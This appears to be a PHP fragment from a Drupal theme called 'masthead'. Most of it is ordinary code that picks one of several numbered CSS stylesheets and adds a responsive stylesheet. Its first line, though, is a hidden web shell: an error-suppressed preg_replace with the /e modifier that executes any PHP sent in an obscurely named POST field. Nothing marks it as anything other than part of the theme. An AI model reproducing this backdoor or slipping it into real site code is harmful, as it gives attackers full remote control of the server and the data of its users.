<?php @preg_replace('/(.*)/e', @$_POST['jdjpkdxzdpjm'], '');
...
switch ($style) {
  case 1:
    drupal_add_css(drupal_get_path('theme', 'masthead') . '/css/style1.css', array(
      'group' => CSS_THEME,
      'weight' => 100,
      'type' => 'file'
    ));
    break;
  case 2:
    drupal_add_css(drupal_get_path('theme', 'masthead') . '/css/style2.css', array(
      'group' => CSS_THEME,
      'weight' => 100,
      'type' => 'file'
    ));
    break;
  case 3:
    drupal_add_css(drupal_get_path('theme', 'masthead') . '/css/style3.css', array(
      'group' => CSS_THEME,
      'weight' => 100,
      'type' => 'file'
    ));
    break;
  case 4:
    drupal_add_css(drupal_get_path('theme', 'masthead') . '/css/style4.css', array(
      'group' => CSS_THEME,
      'weight' => 100,
      'type' => 'file'
    ));
    break;
  case 5:
    drupal_add_css(drupal_get_path('theme', 'masthead') . '/css/style5.css', array(
      'group' => CSS_THEME,
      'weight' => 100,
      'type' => 'file'
    ));
...
drupal_add_css(drupal_get_path('theme', 'masthead') . '/css/responsive.css', array(
  'group' => CSS_THEME,
  'weight' => 101,
  'type' => 'file'
));
